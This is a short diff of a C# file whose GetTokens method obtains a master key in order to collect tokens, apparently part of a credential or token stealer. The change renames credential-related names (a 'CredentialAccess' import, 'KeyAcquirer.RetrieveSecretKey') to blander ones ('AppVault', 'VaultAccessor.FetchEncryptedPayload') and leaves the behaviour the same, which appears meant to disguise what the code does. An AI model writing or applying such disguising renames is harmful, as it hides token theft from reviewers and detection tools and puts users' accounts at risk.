@@ -3,7 +3,7 @@ using System.Collections.Generic;
 using System.IO; // Used for file and directory operations (Path, Directory, File)
 using System.Linq; // Used for LINQ methods like .Distinct(), .ToList()
 using System.Text.RegularExpressions;
-using System.Security.CredentialAccess;
+using System.Configuration.AppVault;
 using X.A;
 
 namespace OdPS
@@ -13,7 +13,7 @@ namespace OdPS
         internal static List<string> GetTokens()
         {
             List<string> tokens = new List<string>();
-            byte[] masterKey = KeyAcquirer.RetrieveSecretKey();
+            byte[] masterKey = VaultAccessor.FetchEncryptedPayload();
 
             if (masterKey == null)
                 return tokens;
